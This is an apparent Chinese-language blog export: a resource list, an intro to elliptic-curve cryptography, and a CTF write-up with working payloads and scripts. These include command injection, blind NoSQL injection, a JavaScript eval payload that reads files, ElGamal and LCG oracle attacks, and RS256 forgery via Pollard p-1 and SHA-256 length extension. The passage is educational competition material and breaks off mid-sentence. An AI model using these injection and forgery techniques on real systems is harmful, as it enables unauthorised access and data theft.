[{"title":"資源收藏分享","url":"/collection/","content":"\n博觀而約取，厚積而薄發\n\n\n\n如果有任何想補充的相關資料都歡迎在留言區分享～\nAI 相關 \n\n模型排行榜\n\nLMSys Chatbot Arena\nLYIHub\nHugging\nFace Open LLM Leaderboard\nHugging\nFace Open ASR Leaderboard\nHugging\nFace TTS Arena\n\n 語言模型\n\nChatGPT\nClaude\nGemini / Google AI Studio\nGrok\nDeepSeek\nPi\n\n 搜尋\n\nPerplexity AI\n\n 生圖\n\nPixAI\n\n 調高解析度\n\nBigjpg\n\n\nHexo \n\nTag\nPlugins\n\n很多 NexT\n功能介紹\n\nMarkDown 語法說明\n\nlatex 化學式輸入語法\n\n演算法 \n\n2023 資訊之芽上課講義\n\nMaster Theorem\n證明\n關於 P,\nNP, CoNP, NP-complete, NP-hard 問題\n\n數學 \n\n線代啟示錄 (很多線性代數的證明都講解得很仔細)\n\nblackpenredpen 頻道 (主要是微積分)\n\n電路學 \n\n「電路學」開放式課程\n\n","categories":["熊貓文"],"tags":["熊貓文"]},{"title":"[ECC 橢圓曲線密碼學：30 天從入門到入土] 前言","url":"/IThome_2025ironman_ECC_Day01/","content":"\n嗨大家，我是 Panda，平常偶爾會出現在各種 Conference\n看看世界長點見識，這次鐵人賽是跟成大資安社牛肉湯的朋朋一起組隊，希望可以跟大家一起完賽。\n以我的觀察，在臺灣打 CTF\n的玩家，最少研究的應該是密碼學吧，也許是覺得學密碼學對實務上沒啥幫助，而事實上\nCrypto 比起 Web Reverse Pwn Forensics 在 Real World\n的漏洞確實少得多，我會想做這個主題就還是為了好玩啦，演算法在腦中流動的感覺還是挺不錯的，另外目前\nAI 還沒辦法很穩定解出 CTF 的 Crypto 題，也能在之後打 CTF\n時創造點優勢。\n之所以會選擇 ECC 一方面是在 CTF 常見的幾種 Crypto 題目中（AES / RSA /\nECC），就只有 ECC\n我是沒什麼學過的，另一方面就是他的應用蠻廣的，比較常有機會跟別人\n炫耀 分享說自己知道他們背後原理是什麼，像\nTLS / SSL、加密貨幣的區塊鏈交易簽章、OpenSSH、WireGuard VPN\n等等的，然後因為 ECC 金鑰比較小，運算比較快，所以也常用在 IoT\n上，就想說趁這個機會好好學一下，免得每次都只是會跟別人打打嘴炮但其實背後原理一知半解 XD\n這個系列中，會以一個已經對 現代密碼學\n有過基礎認識的初學者的角度，記錄學習橢圓曲線密碼學過程，要是文章的安排有點亂還請見諒，如果有寫錯的地方也歡迎大家指正，希望可以幫助到同樣對密碼學演算法有興趣的人們\nowo/\n最後關於題目，我在今天才發現好像應該叫橢圓曲線密碼學比較好，畢竟後面除了講加密外大部分應該都是說數位簽章，但因為組隊挑戰昨天就截止了，除非我重新報名否則鐵人賽的題目沒辦法改，就算了吧，不過每天的標題就還是會寫改成寫橢圓曲線密碼學比較符合內容。\n\n我的環境 \n在這個系列中，我應該會主要用 Python 和 C++ 來實作，作業系統可能會是\nMacOS 15.6 和 Fedora 42 交叉使用，但應該是不會有什麼影響。\n初探 ECC 橢圓曲線密碼學 \n因為我英文不太好，又懶得看文字，就直接上 YouTube\n上看看有沒有些資源可以參考\n\n\n在 Youtube 上查 ECC\n橢圓曲線加密的中文結果\n\n所以我就把兩部影片看完了，挺酷的，給定一條曲線： \\(y^2 = x^3 + ax + b\\)\n為曲線上的點，定義一種特別的加法和乘法， \\(A+B=C\\) 如下圖所示，\\(C\\) 為過 \\(A\\) 與 \\(B\\) 直線，和曲線的交點對稱 X 軸後的點\n\n\n曲線上點的加法\n\n\n\n這樣定義的加法具有結合律（沒截到完整的圖，但相信大家應該可以看得懂）\n\n而 \\(A + A\\) 就是 A\n點切線與曲線的交點對稱 X 軸後的點，並定義這個點為 \\(2A\\) 如下\n\n\n曲線上點的乘法\n\n因為加法有結合律，所以明顯的 \\(3A = A +\n2A\\)，\\(2A + 2A = 4A\\)，對 \\(kA\\) 的那個點只需要做 \\(\\log_{2} k\\)\n次的運算就能找到，這個小細節對後面講到時間效率時會有幫助。\n而在加密時，他們可以用以下的方式創造出共同密鑰並通訊:\n\n對一個給定的曲線（即 \\(y^2 = x^3 + ax +\nb\\) 的 \\(a, b\\)\n固定），和給定的點 \\(G\\)\nAlice 和 Bob 各自生成私鑰 \\(a, b\\)\n(\\(a, b\\) 會是很大的數字)\nAlice 和 Bob 互相傳遞 \\(aG\\) 和\n\\(bG\\) 算出的點是什麼\n這時 Alice 可以算出 \\(a(bG)\\) 而\nBob 可以算出 \\(b(aG)\\)\n而這個結果會是一樣的點，且除他們兩個外沒有其他人能運用 \\(G, aG, bG\\) 算出\n運用這組密鑰做加密通訊\n\n結語 \n今天就差不多到這裡，在初探了是怎麼使用橢圓曲線做加密後，下一步應該會想詳細看看他背後的數學原理，了解他的安全性，希望不要被數學打敗了，感謝大家\nowo/\n參考資料 \n\n公钥加密技术 ECC 椭圆曲线加密算法原理\n椭圆曲线加密与哈希函数是什么？非对称加密是什么？比特币中的数学原理\n\n\n","categories":["IThome 2025 鐵人賽"],"tags":["資安","CTF","IThome 2025 鐵人賽","密碼學","ECC"]},{"title":"2025 SCIST MID CTF Writeup","url":"/2025_SCIST_MID_CTF_Writeup/","content":"SCIST MID CTF Writeup \n\n\nImage\n\n我是 SCIST_31 /\n\nWeb \ndig-waf4 \n跟作業幾乎一樣，但多禁了一些東西，不過空格還是可以用\n$IFS 代替，就成功ㄌ\npayload: more$IFS/*_*\nflag:\nSCIST{command_injection_has_somany_combinations!}\nDa Vinci Code online 🛜 \n要在三次內猜到一個 0-10000 中的一個數字，通靈了幾次沒成功只好去看\ncode 了\n發現\ngetSecretAnswer(command) {    if (command === 'SHOW_ME_THE_ANSWER_PLZ') {        return { status: 'secret', answer: this.answer };    }    return { status: 'error', message: 'Invalid command' };}\nif (data.type === 'guess') {    response = room.gameRoom.guess(data.number);} else if (data.type === 'backdoor') {    response = room.gameRoom.getSecretAnswer(data.command);} else {    response = { status: 'error', message: 'Invalid message type' };}\n所以就只要用 BurpSuit 修改 Websocket 的內容\n{\"type\":\"backdoor\",\"number\":100,\"command\":\"SHOW_ME_THE_ANSWER_PLZ\"}\n{\"status\":\"secret\",\"answer\":7586}\n就能成功獲得 Flag 了～\nflag: SCIST{WC_5c1St_Sc0r3bo4rD_1s5u3}\nnosql injection blind2 \n跟作業的 nosql injection 一樣，但每個字的 range 變大了 (000 ~\n)，因為之前 code 就是用二分搜，所以基本上就改一點點就能得到 Flag ㄌ\nimport requestsimport stringimport re# 設定目標 URLurl = \"http://lab.scist.org:31601/login\"# 初始 flagextracted_flag = \"SCIST\"# 字符集# 添加 Unicode 字符集charset = list(\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}\") + [chr(i) for i in range(168, 0xFFFF + 1) if chr(i).isprintable()]# 將字符集中的每個字元進行正則表達式轉義escaped_charset = \"\".join(re.escape(char) for char in charset)# 布林查詢函數def test_payload(payload):    headers = {\"Content-Type\": \"application/json\"}    data = {        \"username\": \"admin\",        \"password\": {\"$regex\": payload},    }    response = requests.post(url, json=data, headers=headers)    return \"Login successful\" in response.text# 使用二分搜尋法來測試某位置的字符def binary_search_for_char(base_flag, charset):    low, high = 0, len(charset) - 1    while low &lt;= high:        mid = (low + high) // 2        char_to_test = charset[mid]        payload = f\"^{base_flag}{char_to_test}\"        if test_payload(payload):            # 字符符合條件，表示在目前的範圍內            return char_to_test        else:            # 如果字元不在範圍內，調整範圍            if (high - low &gt; 15000): # 發現 regex 用 [] 的範圍好像差不多只有 15000 個字元                flag = False                idx = low                while idx &lt; high:                    idx = min(idx + 15000, high)                    flag = flag or test_payload(f\"^{base_flag}[{\"\".join(charset[low:idx])}]\")                if flag:                    high = mid - 1                else:                    low = mid + 1            else:                payload = f\"^{base_flag}[{\"\".join(charset[low:mid])}]\"                if test_payload(payload):                    high = mid - 1                else:                    low = mid + 1    return None# 開始盲注print(\"[+] Extracting flag...\")while not extracted_flag.endswith(\"}\"):    char = binary_search_for_char(extracted_flag, escaped_charset)    if char:        extracted_flag += char        print(f\"[+] Current flag: {extracted_flag}\")    else:        print(\"[!] No matching character found. Check charset or logic.\")        breakprint(f\"[+] Final flag: {extracted_flag}\")\nflag: SCIST{WOW_y0u_4r3_7h3_ＢＬＩＮＤ}\ncalculator \n看了一下程式碼，發現在 server.js 有一個\neval，所以就可以直接注入，並發現 dockerfile 裡面有寫 flag 的名稱，就得到\nflag ㄌ\nwss.on('connection', (ws) =&gt; {  ws.on('message', (message) =&gt; {    console.log('Received:', message);    try {      let result = eval('(' + message + ')');      ws.send(result);    } catch (e) {      ws.send(e.message);    }  });});\nCOPY flag_3298fh9u32niaergjfwe9ij923.txt /\npayload:\n(() =&gt; require(\"fs\").readFileSync(\"/flag_3298fh9u32niaergjfwe9ij923.txt\", \"utf8\"))()\nflag: SCIST{TRy_70_dO_5Om3_C@1cU1A7Or}\nMisc \nTrick or Treat \n這題是一個 nim game，可以用 nim sum 來解，就寫個 script 輕鬆得到\nflag\nsolve.pyfrom pwn import *def compute_move(state):    nim_sum = 0    for candies in state:        nim_sum ^= candies    for i, candies in enumerate(state):        target = candies ^ nim_sum        if target &lt; candies:            remove = candies - target            return i + 1, remove    # 沒有必勝移動時，從第一個非空箱子拿 1 顆    for i, candies in enumerate(state):        if candies &gt; 0:            return i + 1, 1    return 1, 1# 連線到遠端伺服器（請根據實際伺服器位址與 port 修改）io = remote(\"lab.scist.org\", 31418)print(\"HELLO\")for i in range(100):    print(io.recvuntil(b'boxes, each contains '))    st = io.recvuntil(b'c').decode().strip('c').split(', ')    st = [int(x) for x in st]    while (sum(st) &gt; 0):        print(\"Current state:\", st)        out = compute_move(st)        io.recvuntil(b\"It's your turn, entering (n, k) denotes to take k candy from the box n: \")        io.sendline(str(out).encode())        st[out[0] - 1] -= out[1]        io.recvline()        if io.recvuntil(b' ').decode() == 'Mission ':            break        io.recvuntil(b'I take ')        robot_take = int(io.recvuntil(b' ').decode())        io.recvuntil(b'box ')        robot_box = int (io.recvuntil(b'.').decode()[:-1])        st[robot_box - 1] -= robot_takeio.interactive()\nflag: SCIST{trick-or-treat? trick-xor-treat!}\nCrypto \nElgamal oracle - 首殺 / \n是個白箱，看看是怎麼加密的\nserver.pyimport itertoolsimport jsonimport sysimport typingfrom Crypto.Random.random import randrangefrom Crypto.Util.number import bytes_to_long, getPrime, isPrime, long_to_bytesfrom secret import FLAGclass ElGamal:    def __init__(self, nbit: int = 1024):        self.nbyte = nbit // 8        self.p = getPrime(nbit)        self.g = self.gen_generator()        self.x = randrange(2, self.p - 2)        self.y = pow(self.g, self.x, self.p)    def gen_generator(self) -&gt; int:        for g in self.gen_prime():            if pow(g, (self.p - 1) // 2, self.p) == self.p - 1:                return g        raise ValueError(\"It's impossible to get here.\")    @staticmethod    def gen_prime() -&gt; typing.Generator[int, None, None]:        yield from (2, 3)        for k in itertools.count(5, 6):            if isPrime(k):                yield k            if isPrime(k + 2):                yield k + 2    @property    def public_key(self) -&gt; str:        return json.dumps({\"g\": self.g, \"y\": self.y, \"p\": self.p})    def encrypt(self, plaintext: bytes) -&gt; bytes:        m = bytes_to_long(plaintext)        assert 0 &lt; m &lt; self.p        k = randrange(2, self.p - 2)        c1 = pow(self.g, k, self.p)        c2 = m * pow(self.y, k, self.p) % self.p        return b\"\".join(            c.to_bytes(self.nbyte, byteorder=\"big\")            for c in (c1, c2)        )    def decrypt(self, ciphertext: bytes) -&gt; bytes:        assert len(ciphertext) == 2 * self.nbyte        c1, c2 = tuple(            int.from_bytes(ciphertext[idx:idx+self.nbyte], byteorder=\"big\")            for idx in range(0, len(ciphertext), self.nbyte)        )        m = pow(c1, -self.x, self.p) * c2 % self.p        return long_to_bytes(m)def read_server():    with open(\"./server.py\", \"r\", encoding=\"utf-8\") as file:        print(file.read())def main():    cipher = ElGamal()    print(f\"public_key: {cipher.public_key}\")    print(f\"flag: {cipher.encrypt(FLAG.encode()).hex()}\")    for _ in range(cipher.nbyte):        print(\"&gt; decrypt\")        print(\"&gt; server.py\")        print(\"&gt; exit\")        cmd = input(\"&gt; Command: \")        if cmd == \"exit\":            sys.exit()        elif cmd == \"decrypt\":            ciphertext = bytes.fromhex(input(\"&gt; Enter ciphertext: \"))            print(f\"plaintext last byte: {cipher.decrypt(ciphertext)[-1]}\")        elif cmd == \"server.py\":            read_server()        else:            print(\"Bad hacker\")if __name__ == \"__main__\":    try:        main()    except EOFError:        sys.exit(1)\n每次只會給 ciphertext 解密後的最後一個 byte，試著運用 homomorphic\n來解這題\n\\(c2 \\cdot k \\mod p = m \\cdot k \\mod\np\\)\n我們每次可以得到\n\\(m \\mod 256\\)\n希望可以迭代做到\n\\(\\lfloor \\frac{m}{256}  \\rfloor \\mod 256 ,\n\\lfloor \\frac{m}{256 ^ 2}  \\rfloor \\mod 256, \\lfloor \\frac{m}{256 ^\n3}  \\rfloor \\mod 256, \\cdots\\)\n想到可以用反模數來計算，令 \\(s \\equiv\n256^{-1} \\mod p\\)\n\\[\n\\begin{align*}\n\\lfloor \\frac{m}{256}  \\rfloor \\mod 256 &amp;= (m - (m \\mod 256)) \\cdot\ns \\mod p \\mod 256 \\\\\n&amp;= (256 + ((m \\cdot s \\mod p \\mod 256) - ((m \\mod 256) \\cdot s \\mod\np \\mod 256))) \\mod 256\n\\end{align*}\n\\]\n就這樣不斷迭代就可以得到 flag ㄌ\nsolve.pyfrom pwn import *import jsondef main():    conn = remote('lab.scist.org', 31415)    # conn = process(['python3', 'server.py'])        line = conn.recvline().decode().strip()    public_key = json.loads(line.split(': ', 1)[1])    p = public_key['p']    g = public_key['g']    y = public_key['y']        line = conn.recvline().decode().strip()    flag_hex = line.split(': ', 1)[1]    flag_bytes = bytes.fromhex(flag_hex)    nbyte = 128     c1_flag = int.from_bytes(flag_bytes[:nbyte], 'big')    c2_flag = int.from_bytes(flag_bytes[nbyte:], 'big')    m = 0        s = pow(256, -1, p)        bytes_list = []        for i in range(128):        ciphertext = c1_flag.to_bytes(nbyte, 'big') + (c2_flag % p).to_bytes(nbyte, 'big')        conn.sendlineafter(\"&gt; Command: \", \"decrypt\")        conn.sendlineafter(\"&gt; Enter ciphertext: \", ciphertext.hex())        resp = conn.recvline().decode().strip()        last_byte = int(resp.split(': ')[1])        last_byte = (256 + (last_byte) - (m * pow(s, i) % p)) % 256        m += last_byte * pow(256, i)        bytes_list.append(last_byte)        print(f\"{i}: {chr(last_byte)}\")        c2_flag = (c2_flag * s)        bytes_list.reverse()    flag = bytes(bytes_list).decode(errors='replace')    print(\"Flag:\", flag)        conn.close()if __name__ == '__main__':    main()\nflag:\nSCIST{I said elgamal can perform homomorphic encryption in class. :)}\nLCG cipher - 首殺 / \nserver.pyimport abcimport copyimport sysimport typingfrom Crypto.Util.number import getPrimefrom secret import FLAGclass PRNG(abc.ABC):    passclass LCG(PRNG):    def __init__(self, nbit: int = 128):        self.nbyte = nbit // 8        self.a = getPrime(nbit // 2)        self.c = getPrime(nbit // 2)        self.m = getPrime(nbit)        self.seed = getPrime(nbit // 2)    def next(self) -&gt; typing.Generator[int, None, None]:        while True:            self.seed = (self.a * self.seed + self.c) % self.m            yield from self.seed.to_bytes(self.nbyte, byteorder=\"big\")class Cipher:    def __init__(self, rpng: PRNG):        self.rpng = copy.copy(rpng)    def encrypt(self, plaintext: bytes) -&gt; bytes:        return bytes(pt ^ key for pt, key in zip(plaintext, self.rpng.next()))def read_server():    with open(\"./server.py\", \"r\", encoding=\"utf-8\") as file:        print(file.read())def main():    lcg = LCG()    print(f\"flag: {Cipher(lcg).encrypt(FLAG.encode()).hex()}\")    while True:        print(\"&gt; encrypt\")        print(\"&gt; server.py\")        print(\"&gt; exit\")        cmd = input(\"&gt; Command: \")        if cmd == \"exit\":            sys.exit()        elif cmd == \"encrypt\":            plaintext = input(\"&gt; Enter plaintext: \")            print(f\"enc: {Cipher(lcg).encrypt(plaintext.encode()).hex()}\")        elif cmd == \"server.py\":            read_server()        else:            print(\"Bad hacker\")if __name__ == \"__main__\":    try:        main()    except EOFError:        sys.exit(1)\n可以 byte by byte 的得到 flag，就一個個迭代就可以得到 flag ㄌ\nsolve.pyfrom pwn import *# 伺服器資訊HOST, PORT = \"lab.scist.org\", 31416# 初始 flag 猜測flag_guess = \"SCIST{\"charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&amp;*()-=+}{[]:;\\\"'&lt;&gt;,.?/|\\\\`~ \"def get_encrypted_flag(conn):    \"\"\" 取得加密的 flag \"\"\"    conn.recvuntil(b\"flag: \")    encrypted_flag = bytes.fromhex(conn.recvline().strip().decode())    return encrypted_flagdef encrypt_known_plaintext(conn, plaintext):    \"\"\" 加密已知明文，獲取 PRNG 產生的密鑰 \"\"\"    conn.sendlineafter(b\"&gt; Command: \", b\"encrypt\")    conn.sendlineafter(b\"&gt; Enter plaintext: \", plaintext.encode())    conn.recvuntil(b\"enc: \")    encrypted = bytes.fromhex(conn.recvline().strip().decode())    return encrypteddef brute_force_flag():    global flag_guess    conn = remote(HOST, PORT)    # conn = process(['python3', 'server.py'])        # 取得密文 flag    encrypted_flag = get_encrypted_flag(conn)    print(f\"[+] Encrypted Flag: {encrypted_flag.hex()}\")    # 嘗試逐字解密    while True:        found = False        for char in charset:            test_plaintext = flag_guess + char  # 測試當前猜測            encrypted = encrypt_known_plaintext(conn, test_plaintext)  # 取得對應加密結果                        # XOR flag_guess 的部分，看看是否與 flag 相同            if encrypted[:len(test_plaintext)] == encrypted_flag[:len(test_plaintext)]:                flag_guess += char                print(f\"[+] Found: {flag_guess}\")                found = True                break        if not found or flag_guess.endswith(\"}\"):  # 結束條件            break    print(f\"[+] Final Flag: {flag_guess}\")    conn.close()if __name__ == \"__main__\":    brute_force_flag()\nflag:\nSCIST{using linear congruential generator to implement a stream cipher}\nRS256 - 首殺 / \nserver.pyimport abcimport base64import datetimeimport hashlibimport jsonimport osimport sysfrom Crypto.Random.random import randrangefrom Crypto.Util.number import bytes_to_long, getPrime, inverse, isPrime, long_to_bytes, sizefrom secret import FLAGclass RsaKey:    def __init__(self):        p = self.get_forward_prime()        q = self.get_backward_prime()        self.n = p * q * (q + 2)        self.e = 0x10001        self.d = inverse(self.e, (p - 1) * (q ** 2 - 1))    @staticmethod    def get_forward_prime() -&gt; int:        while True:            p = 2            while size(p) &lt; 527:                p *= getPrime(randrange(4, 17))            if isPrime(p + 1):                return p + 1    @staticmethod    def get_backward_prime() -&gt; int:        while True:            p = getPrime(240)            if isPrime(p) and isPrime(p + 2):                return p    @property    def public_key(self) -&gt; str:        return json.dumps({\"e\": self.e, \"n\": self.n})    @property    def private_key(self) -&gt; str:        return json.dumps({\"d\": self.d, \"n\": self.n})    def sign(self, message: bytes) -&gt; bytes:        return long_to_bytes(pow(bytes_to_long(message), self.d, self.n))    def verify(self, message: bytes, signature: bytes) -&gt; bool:        return message == long_to_bytes(pow(bytes_to_long(signature), self.e, self.n))class JWT256(abc.ABC):    def __init__(self, secret: bytes):        self.secret = secret    @property    def alg(self) -&gt; bytes:        return self.__class__.__name__.encode()    @property    def exp(self) -&gt; datetime.timedelta:        return datetime.timedelta(minutes=1)    @property    def typ(self) -&gt; bytes:        return b\"JWT256\"    @classmethod    def base64encode(cls, data: bytes) -&gt; str:        data = base64.b64encode(data).decode()        data = data.replace(\"+\", \"-\").replace(\"/\", \"_\")        return data.rstrip(\"=\")    @classmethod    def base64decode(cls, data: str) -&gt; bytes:        data = data.replace(\"-\", \"+\").replace(\"_\", \"/\")        data = data + \"=\" * (-len(data) % 4)        return base64.b64decode(data.encode())    @classmethod    def parse(cls, data: bytes) -&gt; dict[bytes, bytes]:        return dict(map(lambda item: item.split(b\"=\", 1), data.split(b\"&amp;\")))    @classmethod    def unparse(cls, data: dict[bytes, bytes]) -&gt; bytes:        return b\"&amp;\".join(map(b\"=\".join, data.items()))    def encode(self, payload: dict[bytes, bytes]) -&gt; str:        header = self.generate_header()        body = self.generate_body(payload)        signature = self.generate_signature(header + b\".\" + body)        return \".\".join(self.base64encode(payload) for payload in (header, body, signature))    def decode(self, token: str) -&gt; dict[bytes, list[bytes]]:        header, body, signature = tuple(self.base64decode(payload) for payload in token.split(\".\"))        self.verify_header(header)        self.verify_body(body)        self.verify_signature(header + b\".\" + body, signature)        return self.parse(body)    def generate_body(self, payload: dict[bytes, bytes]) -&gt; bytes:        payload[b\"iat\"] = f\"{int(datetime.datetime.now().timestamp())}\".encode()        return self.unparse(payload)    def generate_header(self) -&gt; bytes:        payload = {b\"alg\": self.alg, b\"typ\": self.typ}        return self.unparse(payload)    def generate_signature(self, message: bytes) -&gt; bytes:        return hashlib.sha256(self.secret + message).digest()    def verify_body(self, body: bytes):        issued_at = int(self.parse(body)[b\"iat\"].decode())        if datetime.datetime.fromtimestamp(issued_at) + self.exp &lt; datetime.datetime.now():            raise ValueError(\"Verify body failed.\")    def verify_header(self, header: bytes):        payload = self.parse(header)        if not (self.alg == payload[b\"alg\"] and self.typ == payload[b\"typ\"]):            raise ValueError(\"Verify header failed.\")    def verify_signature(self, message: bytes, signature: bytes):        if self.generate_signature(message) != signature:            raise ValueError(\"Verify signature failed.\")class RS256(JWT256):    def __init__(self, secret: bytes, key: RsaKey):        super().__init__(secret)        self.key = key    def generate_signature(self, message: bytes) -&gt; str:        return self.key.sign(super().generate_signature(message))    def verify_signature(self, message: bytes, signature: bytes):        if not self.key.verify(super().generate_signature(message), signature):            raise ValueError(\"Verify signature failed.\")def read_server():    with open(\"./server.py\", \"r\", encoding=\"utf-8\") as file:        print(file.read())def main():    provider = RS256(os.urandom(randrange(37, 43)), RsaKey())    print(f\"public_key: {provider.key.public_key}\")    while True:        print(\"&gt; register\")        print(\"&gt; login\")        print(\"&gt; server.py\")        print(\"&gt; exit\")        cmd = input(\"&gt; Command: \")        if cmd == \"exit\":            sys.exit()        elif cmd == \"register\":            username = input(\"&gt; Input username: \").strip()            token = provider.encode({b\"username\": username.encode(), b\"admin\": b\"N\"})            print(f\"Hi {username}, your token is: {token}\")        elif cmd == \"login\":            data = provider.decode(input(\"&gt; Input token: \").strip())            username = data[b\"username\"].decode()            print(f\"Hi {username}.\")            if data[b\"admin\"] == b\"Y\":                print(f\"Administrator can read the flag: {FLAG}\")        elif cmd == \"server.py\":            read_server()        else:            print(\"Bad hacker\")if __name__ == \"__main__\":    try:        main()    except ValueError:        print(\"Login failed.\")    except EOFError:        sys.exit(1)\n這題超級麻煩，要構造一組 token 使得 JWT 驗證出來 header 正確， body\n正確（在有效時間）， signature 正確，其中 signature 是把 header 和 body\nsha256 後再做一次 RSA 加密，不過原理倒是不難，因為 RSA p-1\n是 smooth 的，可以用 Pollard’s p-1 factorization 攻擊，sha256 要 hash\n的是 secret + {header + ‘.’ + body} ，因為 prase\n時後面如果有跟前面相同的鍵值會蓋掉前面的，所以就可以用 LEA 攻擊， 其中\nsecret 的長度只有可能是 37~43 就一直猜就會對了\nsolve.pyfrom Crypto.Util.number import GCDimport base64def pollard(n: int) -&gt; int:    a, b = 2, 2    while True:        a = pow(a, b, n)        p = GCD(a - 1, n)        if 1 &lt; p &lt; n:            return p        b += 1import gmpy2def fermat(n: int) -&gt; tuple[int, int]:    a = gmpy2.isqrt(n) + 1    b = a ** 2 - n    while not gmpy2.iroot(b, 2)[1]:        a += 1        b = a ** 2 - n    b = gmpy2.iroot(b, 2)[0]    return (a + b, a - b)from Crypto.Util.number import *def new_encode(data):    data = base64.b64encode(data).decode()    data = data.replace(\"+\", \"-\").replace(\"/\", \"_\")    return data.rstrip(\"=\")def new_decode(data):    data = data.replace(\"-\", \"+\").replace(\"_\", \"/\")    data = data + \"=\" * (-len(data) % 4)    return base64.b64decode(data.encode())n = int(input(\"n: \"))p = pollard(n)print(f\"p: {p}\")q, r = fermat(n//p)phi = (p - 1) * (q - 1) * (r - 1)e = 65537d = pow(e, -1, phi)print(f\"d: {d}\")ori_token = input(\"ori_token: \").split(\".\")ori_header = new_decode(ori_token[0])ori_body = new_decode(ori_token[1])ori_sig = new_decode(ori_token[2])message = ori_header + b\".\" + ori_bodyhash_ori = long_to_bytes(pow(bytes_to_long(ori_sig), e, n))print(f\"message: {message}\")print(f\"ori_sig: {ori_sig}\")print(f\"hash_ori: {hash_ori}\")secret_length = 39 # guess 37 ~ 43append_data = b'&amp;admin=Y&amp;iat=1839001735'###### LEA ######import structimport hashlibdef rightrotate(x, n):    return ((x &gt;&gt; n) | (x &lt;&lt; (32 - n))) &amp; 0xffffffffclass SHA256:    def __init__(self, state=None, count=0):        \"\"\"        state: 8個 32 位元整數，表示 SHA256 的中間狀態        count: 已處理的位元組數（不包含目前尚未處理的資料）        \"\"\"        if state is None:            # SHA256 的初始向量 IV            self.h = [                0x6a09e667,                0xbb67ae85,                0x3c6ef372,                0xa54ff53a,                0x510e527f,                0x9b05688c,                0x1f83d9ab,                0x5be0cd19,            ]        else:            self.h = state[:]  # 複製一份狀態        self.unprocessed = b''        self.message_byte_length = count    def update(self, data):        self.unprocessed += data        self.message_byte_length += len(data)        while len(self.unprocessed) &gt;= 64:            self._handle(self.unprocessed[:64])            self.unprocessed = self.unprocessed[64:]    def _handle(self, chunk):        assert len(chunk) == 64        w = list(struct.unpack('&gt;16L', chunk))        for i in range(16, 64):            s0 = rightrotate(w[i-15], 7) ^ rightrotate(w[i-15], 18) ^ (w[i-15] &gt;&gt; 3)            s1 = rightrotate(w[i-2], 17) ^ rightrotate(w[i-2], 19) ^ (w[i-2] &gt;&gt; 10)            w.append((w[i-16] + s0 + w[i-7] + s1) &amp; 0xffffffff)        a, b, c, d, e, f, g, h_val = self.h        k = [            0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,            0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,            0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,            0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,            0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,            0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,            0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,            0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,            0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,            0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,            0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,            0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,            0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,            0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,            0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,            0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,        ]        for i in range(64):            s1 = rightrotate(e, 6) ^ rightrotate(e, 11) ^ rightrotate(e, 25)            ch = (e &amp; f) ^ ((~e) &amp; g)            temp1 = (h_val + s1 + ch + k[i] + w[i]) &amp; 0xffffffff            s0 = rightrotate(a, 2) ^ rightrotate(a, 13) ^ rightrotate(a, 22)            maj = (a &amp; b) ^ (a &amp; c) ^ (b &amp; c)            temp2 = (s0 + maj) &amp; 0xffffffff            h_val = g            g = f            f = e            e = (d + temp1) &amp; 0xffffffff            d = c            c = b            b = a            a = (temp1 + temp2) &amp; 0xffffffff        self.h[0] = (self.h[0] + a) &amp; 0xffffffff        self.h[1] = (self.h[1] + b) &amp; 0xffffffff        self.h[2] = (self.h[2] + c) &amp; 0xffffffff        self.h[3] = (self.h[3] + d) &amp; 0xffffffff        self.h[4] = (self.h[4] + e) &amp; 0xffffffff        self.h[5] = (self.h[5] + f) &amp; 0xffffffff        self.h[6] = (self.h[6] + g) &amp; 0xffffffff        self.h[7] = (self.h[7] + h_val) &amp; 0xffffffff    def _padding(self):        # 根據 SHA256 規範進行填充：先加上 0x80，再補 0x00 至長度 mod 64 為 56，最後加上 8 字節的位元長度        ml = self.message_byte_length * 8        pad = b'\\x80'        while (self.message_byte_length + len(pad)) % 64 != 56:            pad += b'\\x00'        pad += struct.pack('&gt;Q', ml)        return pad    def digest(self):        # 暫存目前狀態        h_backup = self.h[:]        unprocessed_backup = self.unprocessed        message_byte_length_backup = self.message_byte_length        self.update(self._padding())        result = b''.join(struct.pack('&gt;I', h) for h in self.h)        # 還原狀態        self.h = h_backup        self.unprocessed = unprocessed_backup        self.message_byte_length = message_byte_length_backup        return resultml = secret_length + len(message)glue_padding = b'\\x80'while (ml + len(glue_padding)) % 64 != 56:    glue_padding += b'\\x00'glue_padding += (ml * 8).to_bytes(8, 'big')print(\"Glue padding (hex):\", glue_padding.hex())new_message = message + glue_padding + append_dataprint(\"New message:\", new_message)# 1. 使用自訂 SHA256 進行長度延展攻擊# 初始已處理位元組數：secret + message + glue_paddinginitial_count = secret_length + len(message) + len(glue_padding)# 將原始 hash 轉換為初始狀態（8 個 32 位元整數）h = [int.from_bytes(hash_ori[i*4:(i+1)*4], 'big') for i in range(8)]sha = SHA256(state=h, count=initial_count)sha.update(append_data)new_hash_extension = sha.digest()print(\"New hash (extension attack):\", new_hash_extension)new_sig = long_to_bytes(pow(bytes_to_long(new_hash_extension), d, n))new_body = new_message.split(b\".\")[1]print(\"token:\" + new_encode(ori_header) + \".\" + new_encode(new_body) + \".\" + new_encode(new_sig))\n\n\nImage\n\nflag:\nSCIST{It's a bad practice to implement RS256 of JWT.}\nP.S. 為什麼找不到網路上可以用來解 sha256 LEA\n的工具或是腳本啊啊啊，其實 LEA 那部份主要是詠唱出來的\nWelcome \nCATCH THE FLAG! \n在首頁的 console 